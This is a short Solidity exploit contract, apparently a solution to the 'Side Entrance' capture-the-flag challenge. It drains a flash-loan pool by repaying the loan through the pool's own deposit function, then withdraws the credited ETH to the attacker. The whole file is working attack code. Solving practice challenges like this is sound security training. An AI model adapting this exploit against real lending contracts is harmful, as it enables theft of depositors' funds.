// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "solady/src/utils/SafeTransferLib.sol";

import './SideEntranceLenderPool.sol';

contract Exploit {
  address private immutable owner;
  SideEntranceLenderPool sideEntranceLenderPool;

  constructor() {
    owner = msg.sender;
  }

  function drainPool(address pool) external {
    sideEntranceLenderPool = SideEntranceLenderPool(pool);
    sideEntranceLenderPool.flashLoan(pool.balance);
  }

  function execute() external payable {
    sideEntranceLenderPool.deposit{value: msg.value}();
  }

  function withdraw() external {
    sideEntranceLenderPool.withdraw();
    SafeTransferLib.safeTransferETH(owner, address(this).balance);
  }

  fallback() external payable {

  }
}
